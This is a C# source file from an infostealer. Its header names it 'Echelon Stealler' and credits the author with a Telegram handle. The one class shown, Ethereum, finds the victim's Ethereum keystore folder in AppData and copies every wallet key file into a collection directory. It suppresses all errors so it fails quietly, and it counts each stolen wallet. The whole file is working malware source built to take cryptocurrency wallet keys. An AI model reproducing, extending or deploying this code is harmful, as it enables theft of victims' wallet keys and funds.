///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////


using System;
using System.IO;

namespace Echelon
{
    class Ethereum
    {
        public static int count = 0;
        public static string EthereumDir = "\\Wallets\\Ethereum\\";
        public static void EcoinStr(string directorypath) // Works
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppDate + "\\Ethereum\\keystore").GetFiles())
                {
                    Directory.CreateDirectory(directorypath + EthereumDir);
                    file.CopyTo(directorypath + EthereumDir + file.Name);
                }
                count++;
                StartWallets.count++;
            }
            catch 
            {
            }
        }
    }
}
